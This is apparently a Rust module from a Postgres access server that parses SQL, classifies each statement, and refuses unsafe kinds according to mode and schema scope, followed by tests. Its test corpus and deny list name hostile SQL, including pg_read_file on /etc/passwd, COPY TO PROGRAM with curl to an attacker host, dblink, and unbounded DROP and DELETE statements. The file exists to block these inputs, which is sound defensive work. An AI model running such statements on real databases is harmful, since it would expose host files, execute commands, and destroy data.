use std::fmt;

use serde_json::Value;

use crate::config::Mode;
use crate::error::{Error, Result};

pub const CATALOG_SCHEMAS: [&str; 3] = ["pg_catalog", "information_schema", "pg_temp"];

pub const BYPASS_CORPUS: &[&str] = &[
    "SELECT 1; DROP TABLE orders",
    "DELETE FROM orders",
    "INSERT INTO orders VALUES (1)",
    "UPDATE orders SET a = 1",
    "MERGE INTO orders o USING src s ON o.id = s.id WHEN MATCHED THEN DELETE",
    "WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d",
    "WITH i AS (INSERT INTO orders VALUES (1) RETURNING id) SELECT id FROM i",
    "SELECT * FROM (SELECT 1) x, LATERAL (UPDATE orders SET a = 1 RETURNING *) y",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT pg_catalog.pg_read_file('/etc/passwd')",
    "SELECT PG_READ_FILE('/etc/passwd')",
    "SELECT * FROM pg_ls_dir('/')",
    "SELECT * FROM pg_read_binary_file('/etc/passwd')",
    "SELECT lo_import('/etc/passwd')",
    "SELECT lo_export(1, '/tmp/x')",
    "SELECT * FROM dblink('host=x', 'select 1') AS t(a int)",
    "SELECT pg_sleep(10)",
    "SELECT pg_terminate_backend(1)",
    "SELECT pg_cancel_backend(1)",
    "SELECT set_config('search_path', 'other', false)",
    "SELECT pg_reload_conf()",
    "COPY orders TO '/tmp/out.csv'",
    "COPY orders FROM '/etc/passwd'",
    "COPY orders TO PROGRAM 'curl attacker.test'",
    "COPY (SELECT 1) TO PROGRAM 'id'",
    "SET search_path TO other",
    "SET LOCAL role TO postgres",
    "RESET ALL",
    "RESET search_path",
    "DISCARD ALL",
    "LOAD 'x'",
    "BEGIN",
    "COMMIT",
    "ROLLBACK",
    "SAVEPOINT a",
    "DECLARE c CURSOR FOR SELECT 1",
    "FETCH ALL FROM c",
    "PREPARE p AS SELECT 1",
    "EXECUTE p",
    "DEALLOCATE ALL",
    "LISTEN chan",
    "NOTIFY chan, 'x'",
    "LOCK TABLE orders",
    "ALTER SYSTEM SET work_mem = '1GB'",
    "VACUUM orders",
    "ANALYZE orders",
    "REINDEX TABLE orders",
    "CLUSTER orders",
    "CHECKPOINT",
    "REFRESH MATERIALIZED VIEW mv",
    "CALL do_thing()",
    "DO $$ BEGIN DELETE FROM orders; END $$",
    "CREATE TABLE t (a int)",
    "DROP TABLE orders",
    "TRUNCATE orders",
    "ALTER TABLE orders DROP COLUMN a",
    "CREATE INDEX CONCURRENTLY i ON orders (a)",
    "SELECT * INTO backup FROM orders",
    "CREATE TABLE AS SELECT * FROM orders",
    "CREATE ROLE r",
    "GRANT SELECT ON orders TO PUBLIC",
    "SELECT * FROM other.customers",
    "SELECT * FROM \"other\".\"customers\"",
    "SELECT * FROM U&\"other\".customers",
    "SELECT * FROM orders, other.customers",
    "SELECT nextval('s') FROM other.t",
    "EXPLAIN ANALYZE DELETE FROM orders",
    "EXPLAIN (ANALYZE TRUE) UPDATE orders SET a = 1",
    "CREATE SUBSCRIPTION s CONNECTION 'host=x' PUBLICATION p",
    "IMPORT FOREIGN SCHEMA s FROM SERVER srv INTO app",
    "CREATE SERVER s FOREIGN DATA WRAPPER postgres_fdw",
    "SELECT * FROM orders WHERE id = 1; SELECT * FROM other.t",
];

const DENIED_FUNCTIONS: [&str; 30] = [
    "pg_read_file",
    "pg_read_binary_file",
    "pg_ls_dir",
    "pg_ls_logdir",
    "pg_ls_waldir",
    "pg_ls_tmpdir",
    "pg_ls_archive_statusdir",
    "pg_ls_logicalsnapdir",
    "pg_ls_logicalmapdir",
    "pg_ls_replslotdir",
    "pg_stat_file",
    "lo_import",
    "lo_export",
    "dblink",
    "dblink_connect",
    "dblink_connect_u",
    "dblink_exec",
    "dblink_send_query",
    "pg_sleep",
    "pg_sleep_for",
    "pg_sleep_until",
    "pg_terminate_backend",
    "pg_cancel_backend",
    "set_config",
    "pg_reload_conf",
    "pg_rotate_logfile",
    "pg_file_write",
    "pg_file_unlink",
    "pg_file_rename",
    "pg_logdir_ls",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum StatementClass {
    Read,
    Write,
    Procedure,
    Maintenance,
    Ddl,
    Roles,
}

impl StatementClass {
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Read => "read",
            Self::Write => "write",
            Self::Procedure => "procedure",
            Self::Maintenance => "maintenance",
            Self::Ddl => "ddl",
            Self::Roles => "roles",
        }
    }

    #[must_use]
    pub const fn allowed_in(self, mode: Mode) -> bool {
        match self {
            Self::Read => mode.allows_reads(),
            Self::Write | Self::Procedure | Self::Maintenance | Self::Ddl | Self::Roles => {
                mode.allows_writes()
            }
        }
    }
}

impl fmt::Display for StatementClass {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Classification {
    pub class: StatementClass,
    pub kind: String,
    pub destructive_reason: Option<String>,
    pub refusals: Vec<String>,
    pub relations: Vec<RelationName>,
    pub functions: Vec<String>,
    pub fingerprint: String,
    pub sql_sha256: String,
    pub normalized: String,
    pub runs_outside_transaction: bool,
    pub explain_analyze: bool,
    pub returning: bool,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RelationName {
    pub schema: Option<String>,
    pub name: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SchemaScope<'a> {
    pub schema: &'a str,
    pub require_qualified_names: bool,
}

pub fn statement_count(sql: &str) -> Result<usize> {
    let statements =
        pg_query::split_with_parser(sql).map_err(|error| Error::StatementUnparsable {
            reason: error.to_string(),
        })?;
    Ok(statements.len())
}

pub fn classify(sql: &str) -> Result<Classification> {
    let count = statement_count(sql)?;
    if count == 0 {
        return Err(Error::StatementUnparsable {
            reason: "the input holds no statement".to_owned(),
        });
    }
    if count > 1 {
        return Err(Error::StatementMultiple { count });
    }
    let parsed = pg_query::parse(sql).map_err(|error| Error::StatementUnparsable {
        reason: error.to_string(),
    })?;
    let tree =
        serde_json::to_value(&parsed.protobuf).map_err(|error| Error::StatementUnparsable {
            reason: format!("the parse tree could not be read: {error}"),
        })?;
    let fingerprint = pg_query::fingerprint(sql)
        .map(|value| value.hex)
        .unwrap_or_default();
    let sql_sha256 = crate::audit::sha256_hex(sql.trim().as_bytes());
    let normalized = pg_query::normalize(sql).unwrap_or_default();
    let top = tree
        .pointer("/stmts/0/stmt/node")
        .and_then(Value::as_object)
        .and_then(|object| object.iter().next())
        .ok_or_else(|| Error::StatementUnparsable {
            reason: "the input holds no statement".to_owned(),
        })?;
    let (kind, body) = (top.0.clone(), top.1.clone());

    let mut found = Findings::default();
    walk(&tree, &mut found);
    found
        .relations
        .retain(|relation| relation.schema.is_some() || !found.cte_names.contains(&relation.name));

    let mut classification = Classification {
        class: StatementClass::Read,
        kind: kind.clone(),
        destructive_reason: None,
        refusals: Vec::new(),
        relations: found.relations,
        functions: found.functions.clone(),
        fingerprint,
        sql_sha256,
        normalized,
        runs_outside_transaction: false,
        explain_analyze: false,
        returning: false,
    };

    let mut strongest = StatementClass::Read;
    for statement_kind in &found.statement_kinds {
        match class_of(statement_kind) {
            Verdict::Class(class) => strongest = strongest.max(class),
            Verdict::Refuse(rule) => classification.refusals.push(rule.to_owned()),
        }
    }
    if kind == "ExplainStmt" {
        let analyze = explain_analyzes(&body);
        classification.explain_analyze = analyze;
        let inner_kind = body
            .pointer("/query/node")
            .and_then(Value::as_object)
            .and_then(|object| object.keys().next().cloned())
            .unwrap_or_default();
        let inner_class = match class_of(&inner_kind) {
            Verdict::Class(class) => class,
            Verdict::Refuse(rule) => {
                classification.refusals.push(rule.to_owned());
                StatementClass::Read
            }
        };
        strongest = if analyze {
            strongest.max(inner_class)
        } else {
            StatementClass::Read
        };
        if !analyze {
            classification.destructive_reason = None;
        }
    }
    for function in &found.functions {
        let bare = function
            .rsplit('.')
            .next()
            .unwrap_or(function)
            .to_ascii_lowercase();
        if DENIED_FUNCTIONS.contains(&bare.as_str()) {
            classification.refusals.push(format!(
                "the function `{bare}` reaches outside the database"
            ));
        }
    }
    for copy in &found.copies {
        if copy.is_from {
            strongest = strongest.max(StatementClass::Write);
        }
        if copy.is_program {
            classification
                .refusals
                .push("COPY ... PROGRAM runs a command on the database host".to_owned());
        } else if !copy.filename.is_empty() {
            classification
                .refusals
                .push("COPY to or from a file touches the database host's filesystem".to_owned());
        }
    }
    classification.class = strongest;
    classification.returning = found.returning;
    classification.runs_outside_transaction = found.outside_transaction;
    if classification.destructive_reason.is_none() && classification.class != StatementClass::Read {
        classification.destructive_reason = found.destructive_reason.clone();
    }
    Ok(classification)
}

pub fn check(classification: &Classification, mode: Mode, scope: &SchemaScope<'_>) -> Result<()> {
    let refuse = |rule: String| Error::StatementRefused {
        rule,
        mode: mode.to_string(),
    };
    if let Some(rule) = classification.refusals.first() {
        return Err(refuse(rule.clone()));
    }
    for relation in &classification.relations {
        match &relation.schema {
            Some(schema) => {
                if schema != scope.schema && !CATALOG_SCHEMAS.contains(&schema.as_str()) {
                    return Err(refuse(format!(
                        "object outside scoped schema: `{}.{}` (this server serves `{}`)",
                        schema, relation.name, scope.schema
                    )));
                }
            }
            None => {
                if scope.require_qualified_names && !relation.name.starts_with("pg_") {
                    return Err(refuse(format!(
                        "`{}` is not schema-qualified, and a pooled connection has no search_path",
                        relation.name
                    )));
                }
            }
        }
    }
    if !classification.class.allowed_in(mode) {
        return Err(refuse(format!(
            "a {} statement ({}) is not allowed",
            classification.class, classification.kind
        )));
    }
    Ok(())
}

#[derive(Debug, Default)]
struct Findings {
    statement_kinds: Vec<String>,
    functions: Vec<String>,
    relations: Vec<RelationName>,
    cte_names: Vec<String>,
    copies: Vec<CopyShape>,
    destructive_reason: Option<String>,
    returning: bool,
    outside_transaction: bool,
}

#[derive(Debug)]
struct CopyShape {
    is_program: bool,
    is_from: bool,
    filename: String,
}

enum Verdict {
    Class(StatementClass),
    Refuse(&'static str),
}

fn class_of(kind: &str) -> Verdict {
    use StatementClass::{Ddl, Maintenance, Procedure, Read, Roles, Write};
    match kind {
        "SelectStmt" | "VariableShowStmt" | "ExplainStmt" | "CopyStmt" => Verdict::Class(Read),
        "InsertStmt" | "UpdateStmt" | "DeleteStmt" | "MergeStmt" => Verdict::Class(Write),
        "DoStmt" | "CallStmt" => Verdict::Class(Procedure),
        "VacuumStmt" | "ReindexStmt" | "ClusterStmt" | "CheckPointStmt" | "RefreshMatViewStmt" => {
            Verdict::Class(Maintenance)
        }
        "CreateStmt"
        | "AlterTableStmt"
        | "DropStmt"
        | "TruncateStmt"
        | "IndexStmt"
        | "ViewStmt"
        | "CreateSeqStmt"
        | "AlterSeqStmt"
        | "CreateFunctionStmt"
        | "AlterFunctionStmt"
        | "CreateTrigStmt"
        | "CreateEventTrigStmt"
        | "AlterEventTrigStmt"
        | "CreateEnumStmt"
        | "AlterEnumStmt"
        | "CreateDomainStmt"
        | "AlterDomainStmt"
        | "CreateRangeStmt"
        | "CompositeTypeStmt"
        | "DefineStmt"
        | "CreateExtensionStmt"
        | "AlterExtensionStmt"
        | "AlterExtensionContentsStmt"
        | "CommentStmt"
        | "CreatePolicyStmt"
        | "AlterPolicyStmt"
        | "RenameStmt"
        | "AlterObjectSchemaStmt"
        | "AlterObjectDependsStmt"
        | "AlterOwnerStmt"
        | "CreateSchemaStmt"
        | "CreateTableAsStmt"
        | "RuleStmt"
        | "CreateStatsStmt"
        | "AlterStatsStmt"
        | "CreateOpClassStmt"
        | "CreateOpFamilyStmt"
        | "AlterOpFamilyStmt"
        | "CreateCastStmt"
        | "CreateTransformStmt"
        | "CreateConversionStmt"
        | "CreateAmStmt"
        | "SecLabelStmt"
        | "AlterCollationStmt"
        | "AlterTypeStmt"
        | "CreatedbStmt"
        | "DropdbStmt"
        | "AlterDatabaseStmt"
        | "AlterDatabaseSetStmt"
        | "AlterDatabaseRefreshCollStmt"
        | "CreatePublicationStmt"
        | "AlterPublicationStmt"
        | "AlterTableMoveAllStmt"
        | "AlterTableSpaceOptionsStmt"
        | "AlterOperatorStmt"
        | "CreatePlangStmt"
        | "CreateTableSpaceStmt"
        | "DropTableSpaceStmt" => Verdict::Class(Ddl),
        "CreateRoleStmt"
        | "AlterRoleStmt"
        | "AlterRoleSetStmt"
        | "DropRoleStmt"
        | "GrantStmt"
        | "GrantRoleStmt"
        | "AlterDefaultPrivilegesStmt"
        | "DropOwnedStmt"
        | "ReassignOwnedStmt" => Verdict::Class(Roles),
        "VariableSetStmt" => Verdict::Refuse("session settings are managed by the server"),
        "DiscardStmt" => Verdict::Refuse("DISCARD resets session state the server relies on"),
        "LoadStmt" => Verdict::Refuse("LOAD loads code into the database server"),
        "TransactionStmt" => {
            Verdict::Refuse("transactions are managed through the pg_transaction tool")
        }
        "DeclareCursorStmt" | "FetchStmt" | "ClosePortalStmt" => {
            Verdict::Refuse("cursors are managed by the server through paging")
        }
        "PrepareStmt" | "ExecuteStmt" | "DeallocateStmt" => {
            Verdict::Refuse("prepared statements are managed by the server")
        }
        "ListenStmt" | "UnlistenStmt" | "NotifyStmt" => {
            Verdict::Refuse("LISTEN and NOTIFY are not available through this server")
        }
        "LockStmt" => {
            Verdict::Refuse("LOCK is not available; a transaction handle holds its own locks")
        }
        "AlterSystemStmt" => Verdict::Refuse("ALTER SYSTEM changes the server configuration"),
        "CreateSubscriptionStmt" | "AlterSubscriptionStmt" | "DropSubscriptionStmt" => {
            Verdict::Refuse("subscriptions open a connection from the database host")
        }
        "CreateForeignServerStmt"
        | "AlterForeignServerStmt"
        | "CreateFdwStmt"
        | "AlterFdwStmt"
        | "CreateUserMappingStmt"
        | "AlterUserMappingStmt"
        | "DropUserMappingStmt"
        | "ImportForeignSchemaStmt"
        | "CreateForeignTableStmt" => {
            Verdict::Refuse("foreign data access reaches outside the database")
        }
        "RawStmt" => Verdict::Class(Read),
        _ => Verdict::Refuse("a statement kind this server does not run"),
    }
}

fn explain_analyzes(body: &Value) -> bool {
    body.get("options")
        .and_then(Value::as_array)
        .is_some_and(|options| {
            options.iter().any(|option| {
                let name = option
                    .pointer("/node/DefElem/defname")
                    .and_then(Value::as_str)
                    .unwrap_or_default();
                let arg = option.pointer("/node/DefElem/arg");
                name.eq_ignore_ascii_case("analyze") && !arg_is_false(arg)
            })
        })
}

fn arg_is_false(arg: Option<&Value>) -> bool {
    let Some(arg) = arg else {
        return false;
    };
    let text = arg
        .pointer("/node/String/sval")
        .and_then(Value::as_str)
        .or_else(|| {
            arg.pointer("/node/AConst/val/Sval/sval")
                .and_then(Value::as_str)
        })
        .unwrap_or_default();
    matches!(
        text.to_ascii_lowercase().as_str(),
        "false" | "off" | "0" | "no" | "f"
    ) || arg
        .pointer("/node/AConst/val/Boolval/boolval")
        .and_then(Value::as_bool)
        .is_some_and(|value| !value)
        || arg
            .pointer("/node/Integer/ival")
            .and_then(Value::as_i64)
            .is_some_and(|value| value == 0)
}

fn walk(value: &Value, found: &mut Findings) {
    match value {
        Value::Object(object) => {
            if let (Some(Value::String(relname)), Some(Value::String(schemaname))) =
                (object.get("relname"), object.get("schemaname"))
            {
                found.relations.push(RelationName {
                    schema: (!schemaname.is_empty()).then(|| schemaname.clone()),
                    name: relname.clone(),
                });
            }
            for (key, child) in object {
                match key.as_str() {
                    "FuncCall" => {
                        if let Some(name) = dotted_name(child.get("funcname")) {
                            found.functions.push(name);
                        }
                    }
                    "CommonTableExpr" => {
                        if let Some(name) = child.get("ctename").and_then(Value::as_str) {
                            found.cte_names.push(name.to_owned());
                        }
                    }
                    "CopyStmt" => found.copies.push(CopyShape {
                        is_program: child
                            .get("is_program")
                            .and_then(Value::as_bool)
                            .unwrap_or(false),
                        is_from: child
                            .get("is_from")
                            .and_then(Value::as_bool)
                            .unwrap_or(false),
                        filename: child
                            .get("filename")
                            .and_then(Value::as_str)
                            .unwrap_or_default()
                            .to_owned(),
                    }),
                    "DropStmt" => {
                        note_destructive(found, "DROP removes an object");
                        for object_name in child
                            .get("objects")
                            .and_then(Value::as_array)
                            .into_iter()
                            .flatten()
                        {
                            if let Some(name) = qualified_name(object_name) {
                                found.relations.push(name);
                            }
                        }
                    }
                    "TruncateStmt" => note_destructive(found, "TRUNCATE removes every row"),
                    "DropdbStmt" => {
                        note_destructive(found, "DROP DATABASE removes a database");
                        found.outside_transaction = true;
                    }
                    "SelectStmt" => {
                        if child.get("into_clause").is_some_and(|into| !into.is_null()) {
                            found.statement_kinds.push("CreateTableAsStmt".to_owned());
                        }
                    }
                    "DropRoleStmt" => note_destructive(found, "DROP ROLE removes a role"),
                    "DropOwnedStmt" => {
                        note_destructive(found, "DROP OWNED removes everything a role owns");
                    }
                    "ReassignOwnedStmt" => {
                        note_destructive(
                            found,
                            "REASSIGN OWNED changes the owner of everything a role owns",
                        );
                    }
                    "DeleteStmt" => {
                        if where_is_absent_or_constant(child) {
                            note_destructive(
                                found,
                                "DELETE without a narrowing WHERE clause removes every row",
                            );
                        }
                    }
                    "UpdateStmt" => {
                        if where_is_absent_or_constant(child) {
                            note_destructive(
                                found,
                                "UPDATE without a narrowing WHERE clause changes every row",
                            );
                        }
                    }
                    "AlterTableCmd" => {
                        if let Some(reason) = destructive_alter(child) {
                            note_destructive(found, reason);
                        }
                    }
                    "IndexStmt" | "ReindexStmt" => {
                        if child
                            .get("concurrent")
                            .and_then(Value::as_bool)
                            .unwrap_or(false)
                            || child.pointer("/params").is_some()
                        {
                            found.outside_transaction = true;
                        }
                    }
                    "VacuumStmt"
                    | "CreatedbStmt"
                    | "CreateTableSpaceStmt"
                    | "DropTableSpaceStmt"
                    | "AlterSystemStmt"
                    | "CreateSubscriptionStmt" => {
                        found.outside_transaction = true;
                    }
                    "CreateFunctionStmt" | "AlterFunctionStmt" => {
                        if let Some(name) = dotted_name(
                            child
                                .get("funcname")
                                .or_else(|| child.pointer("/func/objname")),
                        ) && let Some(relation) = split_qualified(&name)
                        {
                            found.relations.push(relation);
                        }
                    }
                    _ => {}
                }
                if key.ends_with("Stmt") && child.is_object() {
                    found.statement_kinds.push(key.clone());
                }
                if key == "returning_list" && child.as_array().is_some_and(|list| !list.is_empty())
                {
                    found.returning = true;
                }
                walk(child, found);
            }
        }
        Value::Array(items) => {
            for item in items {
                walk(item, found);
            }
        }
        _ => {}
    }
}

fn note_destructive(found: &mut Findings, reason: &str) {
    if found.destructive_reason.is_none() {
        found.destructive_reason = Some(reason.to_owned());
    }
}

fn dotted_name(value: Option<&Value>) -> Option<String> {
    let items = value?.as_array()?;
    let parts: Vec<&str> = items
        .iter()
        .filter_map(|item| item.pointer("/node/String/sval").and_then(Value::as_str))
        .collect();
    (!parts.is_empty()).then(|| parts.join("."))
}

fn qualified_name(value: &Value) -> Option<RelationName> {
    if let Some(list) = value.pointer("/node/List/items") {
        let joined = dotted_name(Some(list))?;
        return split_qualified(&joined);
    }
    if let Some(objname) = value.pointer("/node/ObjectWithArgs/objname") {
        let joined = dotted_name(Some(objname))?;
        return split_qualified(&joined);
    }
    if let Some(name) = value.pointer("/node/String/sval").and_then(Value::as_str) {
        return Some(RelationName {
            schema: None,
            name: name.to_owned(),
        });
    }
    None
}

fn split_qualified(joined: &str) -> Option<RelationName> {
    let mut parts: Vec<&str> = joined.split('.').collect();
    let name = parts.pop()?.to_owned();
    let schema = parts.pop().map(str::to_owned);
    Some(RelationName { schema, name })
}

fn where_is_absent_or_constant(statement: &Value) -> bool {
    match statement.get("where_clause") {
        None | Some(Value::Null) => true,
        Some(clause) => is_constant_expression(clause),
    }
}

fn is_constant_expression(node: &Value) -> bool {
    if node.pointer("/node/AConst").is_some() || node.pointer("/node/TypeCast").is_some() {
        return true;
    }
    if let Some(expr) = node.pointer("/node/AExpr") {
        let left = expr.get("lexpr");
        let right = expr.get("rexpr");
        return left.is_none_or(is_constant_expression) && right.is_none_or(is_constant_expression);
    }
    if let Some(expr) = node.pointer("/node/BoolExpr") {
        return expr
            .get("args")
            .and_then(Value::as_array)
            .is_some_and(|args| args.iter().all(is_constant_expression));
    }
    false
}

fn destructive_alter(command: &Value) -> Option<&'static str> {
    let subtype = command.get("subtype").and_then(Value::as_i64)?;
    match subtype {
        15 => Some("ALTER TABLE ... DROP COLUMN removes a column and its data"),
        24 => Some("ALTER TABLE ... DROP CONSTRAINT removes a constraint"),
        26 => command
            .pointer("/def/node/ColumnDef/raw_default")
            .filter(|using| !using.is_null())
            .map(|_| "ALTER TABLE ... TYPE ... USING rewrites a column's data"),
        32 => Some("ALTER TABLE ... SET UNLOGGED drops crash safety for the table"),
        62 | 63 => Some("ALTER TABLE ... DETACH PARTITION removes a partition from the table"),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::error::ErrorId;

    const SCOPE: SchemaScope<'static> = SchemaScope {
        schema: "app",
        require_qualified_names: false,
    };

    fn classify_ok(sql: &str) -> Classification {
        classify(sql).unwrap_or_else(|error| panic!("{sql}: {error}"))
    }

    fn refused(sql: &str, mode: Mode) -> String {
        match classify(sql) {
            Ok(classification) => match check(&classification, mode, &SCOPE) {
                Ok(()) => panic!("{sql} was allowed in {mode}"),
                Err(error) => {
                    assert_eq!(error.exit_class(), crate::error::ExitClass::Refused);
                    error.to_string()
                }
            },
            Err(error) => {
                assert!(
                    matches!(
                        error.id(),
                        ErrorId::StatementMultiple | ErrorId::StatementUnparsable
                    ),
                    "{sql}: {error}"
                );
                error.to_string()
            }
        }
    }

    fn allowed(sql: &str, mode: Mode) -> Classification {
        let classification = classify_ok(sql);
        check(&classification, mode, &SCOPE).unwrap_or_else(|error| panic!("{sql}: {error}"));
        classification
    }

    #[test]
    fn one_statement_counts_as_one() {
        assert_eq!(statement_count("SELECT 1").unwrap(), 1);
        assert_eq!(statement_count("SELECT 1;").unwrap(), 1);
    }

    #[test]
    fn a_batch_is_counted_by_the_parser_and_not_by_semicolons() {
        assert_eq!(statement_count("SELECT 1; DROP TABLE t").unwrap(), 2);
        assert_eq!(statement_count("SELECT ';'; SELECT 2").unwrap(), 2);
        assert_eq!(statement_count("SELECT $$a;b$$").unwrap(), 1);
    }

    #[test]
    fn an_empty_input_holds_no_statement() {
        assert_eq!(statement_count("").unwrap(), 0);
        assert_eq!(
            classify("   \n").unwrap_err().id(),
            ErrorId::StatementUnparsable
        );
    }

    #[test]
    fn a_statement_the_parser_refuses_is_reported_with_its_reason() {
        let error = statement_count("SELECT FROM WHERE").unwrap_err();
        assert_eq!(error.id(), ErrorId::StatementUnparsable);
        assert!(error.to_string().contains("syntax error"), "{error}");
    }

    #[test]
    fn a_plain_select_is_a_read_with_its_relations_and_fingerprint() {
        let classification = allowed("SELECT id, name FROM orders WHERE id = 5", Mode::ReadOnly);
        assert_eq!(classification.class, StatementClass::Read);
        assert_eq!(classification.kind, "SelectStmt");
        assert_eq!(classification.relations.len(), 1);
        assert_eq!(classification.relations[0].name, "orders");
        assert_eq!(classification.relations[0].schema, None);
        assert_eq!(classification.fingerprint.len(), 16);
        assert_eq!(
            classification.normalized,
            "SELECT id, name FROM orders WHERE id = $1"
        );
        assert!(classification.destructive_reason.is_none());
    }

    #[test]
    fn reads_of_the_catalogs_and_the_scoped_schema_are_allowed() {
        allowed("SELECT relname FROM pg_catalog.pg_class", Mode::ReadOnly);
        allowed("SELECT * FROM information_schema.columns", Mode::ReadOnly);
        allowed("SELECT * FROM app.orders", Mode::ReadOnly);
        allowed("SHOW search_path", Mode::ReadOnly);
        allowed("EXPLAIN SELECT * FROM orders", Mode::ReadOnly);
        allowed(
            "EXPLAIN (ANALYZE, BUFFERS) SELECT * FROM orders",
            Mode::ReadOnly,
        );
        allowed("COPY orders TO STDOUT", Mode::ReadOnly);
        allowed("SELECT * FROM orders FOR UPDATE", Mode::ReadOnly);
    }

    #[test]
    fn the_bypass_corpus_is_refused_in_read_only_mode() {
        let corpus = BYPASS_CORPUS;
        assert!(corpus.len() >= 40);
        for sql in corpus {
            let message = refused(sql, Mode::ReadOnly);
            assert!(!message.is_empty());
        }
    }

    #[test]
    fn write_only_mode_refuses_reads_and_allows_writes_with_returning() {
        refused("SELECT * FROM orders", Mode::WriteOnly);
        refused("SHOW search_path", Mode::WriteOnly);
        refused("COPY orders TO STDOUT", Mode::WriteOnly);
        refused("EXPLAIN SELECT 1", Mode::WriteOnly);
        let insert = allowed(
            "INSERT INTO orders (a) VALUES (1) RETURNING id",
            Mode::WriteOnly,
        );
        assert_eq!(insert.class, StatementClass::Write);
        assert!(insert.returning);
        assert!(insert.destructive_reason.is_none());
        allowed("UPDATE orders SET a = 2 WHERE id = 1", Mode::WriteOnly);
        allowed("DELETE FROM orders WHERE id = 1", Mode::WriteOnly);
        allowed("COPY orders FROM STDIN", Mode::WriteOnly);
        allowed(
            "MERGE INTO orders o USING src s ON o.id = s.id WHEN MATCHED THEN UPDATE SET a = s.a",
            Mode::WriteOnly,
        );
    }

    #[test]
    fn read_write_mode_allows_everything_but_the_always_refused_shapes() {
        allowed("SELECT * FROM orders", Mode::ReadWrite);
        allowed("DELETE FROM orders WHERE id = 1", Mode::ReadWrite);
        allowed("CREATE TABLE t (a int)", Mode::ReadWrite);
        allowed("VACUUM orders", Mode::ReadWrite);
        allowed("CALL do_thing()", Mode::ReadWrite);
        allowed("GRANT SELECT ON orders TO r", Mode::ReadWrite);
        allowed(
            "EXPLAIN ANALYZE DELETE FROM orders WHERE id = 1",
            Mode::ReadWrite,
        );
        for sql in [
            "SET search_path TO other",
            "BEGIN",
            "COPY orders TO PROGRAM 'id'",
            "SELECT pg_read_file('x')",
            "ALTER SYSTEM SET work_mem = '1GB'",
            "SELECT * FROM other.customers",
            "LISTEN chan",
            "LOCK TABLE orders",
            "PREPARE p AS SELECT 1",
        ] {
            refused(sql, Mode::ReadWrite);
        }
    }

    #[test]
    fn destructive_shapes_are_flagged_with_their_reason() {
        for (sql, expected) in [
            ("DROP TABLE orders", "DROP"),
            ("TRUNCATE orders", "TRUNCATE"),
            ("DELETE FROM orders", "DELETE without"),
            ("DELETE FROM orders WHERE true", "DELETE without"),
            ("DELETE FROM orders WHERE 1 = 1", "DELETE without"),
            ("UPDATE orders SET a = 1", "UPDATE without"),
            ("UPDATE orders SET a = 1 WHERE 'x' = 'x'", "UPDATE without"),
            ("ALTER TABLE orders DROP COLUMN a", "DROP COLUMN"),
            ("ALTER TABLE orders DROP CONSTRAINT c", "DROP CONSTRAINT"),
            ("ALTER TABLE orders DETACH PARTITION p", "DETACH PARTITION"),
            (
                "ALTER TABLE orders ALTER COLUMN a TYPE int USING a::int",
                "USING",
            ),
            ("ALTER TABLE orders SET UNLOGGED", "UNLOGGED"),
            ("DROP DATABASE d", "DROP DATABASE"),
            ("DROP ROLE r", "DROP ROLE"),
            ("DROP OWNED BY r", "DROP OWNED"),
        ] {
            let classification = classify_ok(sql);
            let reason = classification
                .destructive_reason
                .unwrap_or_else(|| panic!("{sql} was not flagged"));
            assert!(reason.contains(expected), "{sql}: {reason}");
        }
        for sql in [
            "DELETE FROM orders WHERE id = 1",
            "UPDATE orders SET a = 1 WHERE id > 5",
            "ALTER TABLE orders ADD COLUMN b int",
            "ALTER TABLE orders ALTER COLUMN a TYPE bigint",
            "INSERT INTO orders VALUES (1)",
            "CREATE TABLE t (a int)",
        ] {
            assert!(
                classify_ok(sql).destructive_reason.is_none(),
                "{sql} was flagged"
            );
        }
    }

    #[test]
    fn statements_that_cannot_run_inside_a_transaction_are_marked() {
        assert!(classify_ok("CREATE INDEX CONCURRENTLY i ON orders (a)").runs_outside_transaction);
        assert!(classify_ok("REINDEX TABLE CONCURRENTLY orders").runs_outside_transaction);
        assert!(classify_ok("VACUUM orders").runs_outside_transaction);
        assert!(classify_ok("CREATE DATABASE d").runs_outside_transaction);
        assert!(!classify_ok("CREATE INDEX i ON orders (a)").runs_outside_transaction);
        assert!(!classify_ok("SELECT 1").runs_outside_transaction);
    }

    #[test]
    fn an_explain_without_analyze_never_executes_but_still_scans_for_escape_hatches() {
        let plain = classify_ok("EXPLAIN DELETE FROM orders");
        assert_eq!(plain.class, StatementClass::Read);
        assert!(!plain.explain_analyze);
        assert!(plain.destructive_reason.is_none());
        let analyzed = classify_ok("EXPLAIN (ANALYZE) DELETE FROM orders");
        assert_eq!(analyzed.class, StatementClass::Write);
        assert!(analyzed.explain_analyze);
        let off = classify_ok("EXPLAIN (ANALYZE OFF) DELETE FROM orders");
        assert_eq!(off.class, StatementClass::Read);
        refused("EXPLAIN SELECT pg_read_file('x')", Mode::ReadWrite);
    }

    #[test]
    fn a_pooled_scope_requires_qualified_names() {
        let scope = SchemaScope {
            schema: "app",
            require_qualified_names: true,
        };
        let bare = classify_ok("SELECT * FROM orders");
        let error = check(&bare, Mode::ReadOnly, &scope).unwrap_err();
        assert!(error.to_string().contains("schema-qualified"), "{error}");
        let qualified = classify_ok("SELECT * FROM app.orders");
        check(&qualified, Mode::ReadOnly, &scope).unwrap();
        let catalog = classify_ok("SELECT * FROM pg_catalog.pg_class");
        check(&catalog, Mode::ReadOnly, &scope).unwrap();
    }

    #[test]
    fn ddl_on_another_schema_is_refused_through_every_name_position() {
        for sql in [
            "CREATE TABLE other.t (a int)",
            "DROP TABLE other.t",
            "ALTER TABLE other.t ADD COLUMN b int",
            "CREATE INDEX i ON other.t (a)",
            "DROP FUNCTION other.f()",
            "CREATE FUNCTION other.f() RETURNS int LANGUAGE sql AS 'SELECT 1'",
            "INSERT INTO other.t VALUES (1)",
            "COPY other.t FROM STDIN",
            "TRUNCATE other.t",
        ] {
            let message = refused(sql, Mode::ReadWrite);
            assert!(
                message.contains("outside scoped schema"),
                "{sql}: {message}"
            );
        }
    }

    #[test]
    fn a_multi_statement_input_is_refused_before_classification() {
